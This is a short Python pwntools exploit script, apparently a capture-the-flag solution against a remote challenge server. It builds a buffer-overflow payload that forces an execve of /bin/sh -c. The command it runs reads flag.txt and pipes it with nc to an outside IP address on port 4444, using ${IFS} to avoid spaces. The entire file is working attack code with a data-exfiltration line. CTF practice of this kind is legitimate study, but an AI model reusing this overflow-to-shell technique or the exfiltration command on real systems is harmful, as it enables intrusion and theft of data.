from pwn import *

if args['LOCAL']:
    io = remote('127.0.0.1', 19303)
else:
    io = remote('shell.actf.co', 19303)



# 4B 
io.send('GET ')


sys_execve = 59
fd = 0x402100
count = 0xffffffffffffffbc + 3# so we get execve

# buf addr = 0x402010 
# fd addr  = 0x402810
# FILL
payload = 'a'*240
payload += '/bin/sh\x00'  # AT 0x402100
payload += '-c' + '\x00'*6
payload += 'cat${IFS}flag.txt|nc${IFS}51.38.138.162${IFS}4444\x00' # we couldnt make spaces...
payload += cyclic(2048,n=8)[:2048-len(payload)]
payload += p64(fd)        # execve's path argument // also crashes write
payload += p64(count)     # this will make us sys_execve later
payload += p64(0x402100)  # ARGV[0] for execve is here!
payload += p64(0x402108)  # ARGV[0] continuation for execve is here!
payload += p64(0x402110)  # ARGV[0] continuation for execve is here!
payload += p64(0)         # ARGV[1] == NULL
payload += ' '            # trigger exploit

io.sendline(payload)
io.recvuntil('HTTP/1.1 200 OK')

io.interactive()
